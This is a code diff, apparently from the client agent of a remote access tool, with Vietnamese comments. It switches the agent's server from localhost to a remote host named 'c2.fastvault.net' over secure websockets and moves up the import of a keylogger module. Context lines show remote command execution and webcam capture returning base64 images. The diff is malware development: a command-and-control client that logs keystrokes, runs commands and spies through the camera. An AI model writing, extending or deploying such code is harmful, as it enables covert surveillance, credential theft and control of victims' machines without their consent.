@@ -24,8 +24,8 @@ logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] Agen
 log = logging.getLogger("agent")
 
 # ========== CONFIG ==========
-SERVER_URL = "127.0.0.1:8000"    # localhost cho agent chay cung may
-USE_SSL = False                  # False cho LAN, True cho cloudflare
+SERVER_URL = "c2.fastvault.net"    # VPS server
+USE_SSL = True                     # True cho cloudflare
 # ============================
 
 def get_device_id():
@@ -35,6 +35,13 @@ def get_device_id():
 
 DEVICE_ID = get_device_id()
 WS_URL = f"{'wss' if USE_SSL else 'ws'}://{SERVER_URL}/ws/{DEVICE_ID}"
+
+# Path to modules
+_modules_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'agent_core')
+if os.path.exists(_modules_dir):
+    sys.path.insert(0, _modules_dir)
+
+from modules.keylogger import handle as keylog_handle
 
 def get_system_info():
     return {
@@ -106,8 +113,6 @@ for name in sorted(items, key=lambda x: (not os.path.isdir(os.path.join(p,x)), x
         return {"output": out.strip() or "(no output)", "exit_code": r.returncode}
     except Exception as e:
         return {"output": f"[ERROR] {e}", "exit_code": -1}
-
-from modules.keylogger import handle as keylog_handle
 
 def capture_webcam():
     """Chup webcam, tra ve base64 trong output"""
